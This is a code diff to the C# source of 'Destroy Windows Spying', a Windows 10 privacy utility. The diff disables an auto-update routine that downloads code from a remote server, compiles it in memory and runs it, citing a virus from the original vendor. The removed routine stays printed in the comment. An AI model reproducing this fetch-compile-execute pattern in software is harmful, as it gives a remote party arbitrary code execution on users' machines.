@@ -171,16 +171,16 @@ namespace DWS
             };
             MinimizeButton.Click += (sender, args) => WindowState = WindowState.Minimized;
             CloseButton.Click += (sender, args) => Close();
-            RenessansLogo.MouseDown += (sender, args) => Process.Start("http://renessans.bz/");
+            RenessansLogo.MouseDown += (sender, args) => Process.Start("https://github.com/Wohlstand/Destroy-Windows-10-Spying");
             CheckSystemStatus();
             AboutInfo.Text =
-                "Destroy Windows Spying (DWS) - a free utility that prevents tracking of your activity in Windows 10 and enhances the security and privacy settings of the operating system from Microsoft.\r\n\r\n\r\n" + 
+                "Destroy Windows Spying (DWS) - a free utility that prevents tracking of your activity in Windows 10 and enhances the security and privacy settings of the operating system from Microsoft.\r\n\r\n\r\n" +
                 "\tChangelog:\r\n" +
                 "\t\t\tv 1.0.2.0 Fix DWS stopped working" +
                 "\t\t\tv 1.0.1.0 Hosts manager and fixes" +
                 "\t\t\t+ Add hosts manager" +
                 "\t\t\t+ Add enable windows defender feature" +
-                "\t\t\t* Fix PcaSvc error" + 
+                "\t\t\t* Fix PcaSvc error" +
                 "\t\t1.0 First release!";
 
             new Thread(AutoUpdate).Start(); // auto update
@@ -194,6 +194,8 @@ namespace DWS
 
         private void AutoUpdate()
         {
+            /* Disable auto-update completely. Renessans became as jerk with virus... */
+            /*
             try
             {
                 System.Reflection.Assembly _assembly = System.Reflection.Assembly.GetExecutingAssembly();
@@ -201,19 +203,19 @@ namespace DWS
                 string version = fvi.FileVersion;
                 var code =
                     new WebClient().DownloadString(
-                        $"http://renessans.bz/update/checkupdate.php?ver={version}&rnd={new Random().Next(0, 9999999)}");
+                        $"http://<REPLACE-ME-WITH-VALID-URL>/update/checkupdate.php?ver={version}&rnd={new Random().Next(0, 9999999)}");
                 CSharpCodeProvider provider = new CSharpCodeProvider();
                 CompilerParameters parameters = new CompilerParameters();
                 foreach (var dllInput in code.Split('\n')[0].Split(','))
                 {
                     parameters.ReferencedAssemblies.Add(ReplaceBadCharsInPath(dllInput));
                 }
-                
+
                 parameters.GenerateInMemory = true;
                 parameters.GenerateExecutable = true;
 
                 CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
-                
+
                 if (results.Errors.HasErrors)
                 {
                     foreach (CompilerError error in results.Errors)
@@ -237,6 +239,7 @@ namespace DWS
                 Logger.Log("Error check updates.", Logger.LogType.ERROR);
                 Logger.Log($"Exception {e}", Logger.LogType.DEBUG);
             }
+            */
         }
 
         private void CheckSystemStatus()
@@ -307,7 +310,7 @@ namespace DWS
                     Logger.Log("Delete keylogger...");
                     WindowsUtil.RunCmd("/c reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Search\" /v \"AllowCortana\" /t REG_DWORD /d 0 /f ");
                     Logger.Log("Disable cortana...");
-                    
+
                     foreach (var serviceName in DwsResources.ServicesList)
                     {
                         ServiceSC.DisableService(serviceName);
